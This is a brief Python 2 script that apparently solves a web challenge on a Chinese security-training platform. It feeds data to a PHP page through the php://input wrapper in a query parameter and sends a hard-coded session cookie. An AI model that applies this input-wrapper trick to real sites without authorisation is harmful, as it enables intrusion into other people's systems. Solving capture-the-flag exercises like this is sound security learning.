#coding:utf-8
import urllib
try:
  import requests
except ImportError:
  raise SystemExit('\n[!] requests模块导入错误,请执行pip install requests安装!')

try:
  print '\n网络信息安全攻防学习平台脚本关第8题\n'
  s = requests.Session()
  url = 'http://1.hacklist.sinaapp.com/base13_ead1b12e47ec7cc5390303831b779d47/index.php?^.^=php://input'
  header = {'Cookie': 'saeut=218.108.135.246.1416190347811282; PHPSESSID=5f3d9f5685452d1474f59371067e36af'}
  r = s.post(url, data=urllib.unquote("%28%E2%97%8F%27%E2%97%A1%27%E2%97%8F%29"), headers=header)
  print r.content
except KeyboardInterrupt:
  raise SystemExit('大爷,按您的吩咐,已成功退出！')